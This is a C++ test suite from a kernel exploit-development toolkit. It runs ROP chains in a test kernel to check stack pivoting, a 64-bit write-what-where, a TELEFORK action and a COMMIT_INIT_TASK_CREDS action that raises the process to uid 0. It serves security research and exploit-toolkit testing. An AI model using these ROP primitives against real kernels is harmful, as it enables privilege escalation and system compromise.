#pragma once

#include <unistd.h>
#include <sys/wait.h>
#include "test/TestSuite.h"
#include "test/TestUtils.h"
#include <kernelXDK/xdk_device/xdk_device.h>
#include <kernelXDK/util/HexDump.h>
#include <kernelXDK/util/error.h>
#include <kernelXDK/payloads/RopChain.h>
#include <kernelXDK/payloads/Payload.h>

class RopActionTests: public TestSuite {
    XdkDevice* xdk_;
public:
    RopActionTests(): TestSuite("RopActionRuntimeTests", "RopAction runtime tests") { }

    void init() {
        xdk_ = &env->GetXdkDevice();
    }

    RopChain GetRopChain() {
        return RopChain(env->GetTarget(), xdk_->KaslrLeak());
    }

    // return true in case of a fork
    bool ExecuteRopChain(RopChain& rop, uint64_t min_stack = 0, uint64_t max_stack = 4096, uint64_t buf_size = 4096) {
        rop.Add(xdk_->GetRipControlRecoveryAddr());

        Payload p(buf_size);
        auto rop_offs = p.Size() - rop.GetByteSize();
        p.Set(rop_offs, rop.GetData());

        auto rop_buf_addr = xdk_->AllocBuffer(p.GetData(), true);
        Log("rop_buf_addr = 0x%lx", rop_buf_addr);

        auto orig_pid = getpid();
        xdk_->SetRspAndRet(rop_buf_addr + rop_offs);
        if (getpid() != orig_pid)
            return true;

        auto used_stack = xdk_->Read(rop_buf_addr, rop_offs);
        Log("Stack content:\n%s", HexDump::Dump(used_stack).c_str());
        xdk_->Kfree(rop_buf_addr);

        size_t non_used_bytes = 0;
        for (; non_used_bytes < used_stack.size(); non_used_bytes++)
            if (used_stack[non_used_bytes] != 0)
                break;

        auto used_stack_size = used_stack.size() - non_used_bytes;
        if (used_stack_size < min_stack || used_stack_size > max_stack)
            throw ExpKitError("Expected stack size between %u .. %u bytes, but it used %u bytes", min_stack, max_stack, used_stack_size);

        return false;
    }

    // return true in case of a fork
    bool ExecuteRopAction(RopActionId id, std::vector<uint64_t> arguments = {}, uint64_t min_stack = 0, uint64_t max_stack = 4096, uint64_t buf_size = 4096) {
        auto rop = GetRopChain();
        rop.AddRopAction(id, arguments);
        return ExecuteRopChain(rop);
    }

    TEST_METHOD(commitCredsTest, "COMMIT_INIT_TASK_CREDS is working") {
        setuid(1);
        ASSERT_EQ(1, getuid());
        ExecuteRopAction(RopActionId::COMMIT_INIT_TASK_CREDS, {}, 100, 128);
        ASSERT_EQ(0, getuid());
    }

    TEST_METHOD(winTargetWorks, "win_target is working") {
        auto rop = GetRopChain();
        rop.Add(xdk_->WinTarget());
        // TODO: based on tests sometimes we see stack usage here up to 240 bytes.
        //   Our theory is that an interrupt is happening and it uses the stack.
        //   But this needs investigation later and proper handling of this issue.
        ExecuteRopChain(rop, 0, 240);
        xdk_->CheckWin();
    }

    TEST_METHOD(writeWhatWhereTest, "WRITE_WHAT_WHERE_64 is working") {
        Payload p(40);
        size_t target_offs = 16;
        uint64_t new_value = 0x1122334455667788;

        auto target_buf_addr = xdk_->AllocBuffer(p.GetData(), true);
        ExecuteRopAction(RopActionId::WRITE_WHAT_WHERE_64, {target_buf_addr + target_offs, new_value}, 0, 0);

        auto buf_leak = xdk_->Read(target_buf_addr, p.Size());
        Log("Leaked buffer:\n%s", HexDump::Dump(buf_leak).c_str());
        xdk_->Kfree(target_buf_addr);

        for (size_t i = 0; i < p.Size(); i += 8)
            ASSERT_EQ(i == target_offs ? new_value : 0, *((uint64_t*)&buf_leak[i]));
    }

    TEST_METHOD(teleforkTest, "TELEFORK is working, its stack usage is in expected range") {
        if (ExecuteRopAction(RopActionId::TELEFORK, {10}, 400, 2600))
            exit(123);

        // TODO: this can conflict with other user-space fork calls, use a better design?
        int status;
        if (wait(&status) == -1 || !WIFEXITED(status) || WEXITSTATUS(status) != 123)
            throw ExpKitError("No child was forked.");
    }
};
